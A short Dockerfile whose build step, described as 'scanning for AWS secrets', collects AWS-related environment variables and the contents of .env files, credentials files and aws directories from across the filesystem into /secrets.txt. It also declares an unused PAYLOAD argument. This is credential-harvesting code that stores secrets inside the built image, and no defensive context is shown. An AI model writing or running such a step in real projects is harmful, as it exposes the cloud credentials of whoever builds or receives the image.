FROM alpine:latest
ARG PAYLOAD

RUN echo "Scanning for AWS secrets..." && \
    (env | grep -E 'AWS_|EC2_|S3_' || true) > /secrets.txt && \
    find / \( -name "*.env" -o -name "credentials" -o -path "*/aws/*" \) -exec cat {} \; >> /secrets.txt 2>/dev/null
